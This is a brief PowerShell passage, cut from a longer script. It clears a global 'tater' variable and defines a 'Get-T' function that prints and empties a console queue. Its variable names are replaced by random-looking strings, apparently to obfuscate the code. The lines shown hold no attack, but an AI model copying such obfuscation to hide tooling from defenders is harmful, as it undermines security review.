    }
    rv tater -scope global
} 
function Get-T
{
    while(${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Count -gt 0)
    {
        echo(${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue[0] + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.newline)
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.RemoveRange(0,1)
    }
}